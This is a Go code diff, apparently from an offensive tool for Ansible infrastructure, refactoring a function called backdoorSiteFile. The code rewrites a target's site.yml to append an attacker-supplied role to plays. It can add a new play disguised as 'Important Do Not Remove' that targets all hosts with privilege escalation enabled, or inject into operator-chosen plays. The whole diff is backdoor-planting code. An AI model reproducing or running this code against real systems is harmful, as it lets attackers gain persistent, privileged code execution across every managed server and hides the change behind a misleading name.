@@ -36,7 +36,7 @@ type ansible []struct {
 	Name   string   `yaml:"name"`
 	Hosts  string   `yaml:"hosts"`
 	Become bool     `yaml:"become"`
-	Roles  []string `yaml:"roles"`
+	Roles  []string `yaml:"roles,flow"`
 }
 
 var (
@@ -314,38 +314,63 @@ func backdoorSiteFile() {
 	}
 
 	unmarshalled := ansible{}
-	err = yaml.Unmarshal(bytes, unmarshalled)
+	err = yaml.Unmarshal(bytes, &unmarshalled)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	for i, item := range unmarshalled {
-		if strings.Compare(item.Hosts, "all") == 0 {
+	var hosts []string
+	hostAllFound := false
 
-			log.Printf("'Hosts: all' found, appending playbook to roles")
-			unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
-			return
+	for _, host := range unmarshalled {
+		hosts = append(hosts, host.Hosts)
+		if strings.Compare(host.Hosts, "all") == 0 {
+			hostAllFound = true
 		}
 	}
 
-	newItem := ansible{{
-		"Important Do Not Remove",
-		"all",
-		true,
-		[]string{ansibleRole},
-	}}
-	unmarshalled = append(unmarshalled, newItem[0])
+	if hostAllFound {
+		if ans, err := moseutils.AskUserQuestion("Backdoor the step containing hosts:all?", a.OsTarget); ans && err == nil {
+			for i, item := range unmarshalled {
+				if strings.Compare(item.Hosts, "all") == 0 {
 
-	marshalled, err := yaml.Marshal(&unmarshalled)
-	if err != nil {
-		log.Fatal(err)
+					log.Printf("'Hosts: all' found, appending playbook to roles")
+					unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
+					writeYamlToSite(unmarshalled)
+					return
+				}
+			}
+		} else if err != nil {
+			log.Fatalf("Quitting...")
+		}
 	}
 
-	err = moseutils.WriteFile(files.siteFile, marshalled, 0644)
-	if err != nil {
-		log.Fatalf("error: %v", err)
+	if !hostAllFound {
+		log.Println("No hosts:all found in site.yml")
+		if ans, err := moseutils.AskUserQuestion("Would you like to inject a hosts: all into the site.yml?", a.OsTarget); ans && err == nil {
+			newItem := ansible{{
+				"Important Do Not Remove",
+				"all",
+				true,
+				[]string{ansibleRole},
+			}}
+			unmarshalled = append(unmarshalled, newItem[0])
+			writeYamlToSite(unmarshalled)
+			return
+		} else if err != nil {
+			log.Fatalf("Quitting...")
+		}
 	}
-	log.Printf("%s successfully create", files.siteFile)
+	moseutils.Msg("The following hosts were found in the site.yml file %v", hosts)
+	for i, _ := range unmarshalled {
+		if ans, err := moseutils.AskUserQuestion(fmt.Sprintf("Inject the following name: %v, hosts: %v, roles: %v?", unmarshalled[i].Name, unmarshalled[i].Hosts, unmarshalled[i].Roles), a.OsTarget); ans && err == nil {
+			unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
+		} else if err != nil {
+			log.Fatalf("Quitting...")
+		}
+	}
+	writeYamlToSite(unmarshalled)
+
 	// find the hosts: all section
 	// if it doesn't exist, create it
 	// make sure to put the backdoor at the bottom of roles
@@ -356,6 +381,19 @@ func backdoorSiteFile() {
 	// https://raw.githubusercontent.com/l50/ansible-docker-compose/master/ansible/site.yml
 	// https://raw.githubusercontent.com/ansible/ansible-examples/master/mongodb/site.yml
 	// https://github.com/ansible/ansible-examples/blob/master/lamp_haproxy/site.yml
+}
+
+func writeYamlToSite(siteYaml ansible) {
+	marshalled, err := yaml.Marshal(&siteYaml)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	err = moseutils.WriteFile(files.siteFile, marshalled, 0644)
+	if err != nil {
+		log.Fatalf("error: %v", err)
+	}
+	log.Printf("%s successfully created", files.siteFile)
 }
 
 func main() {
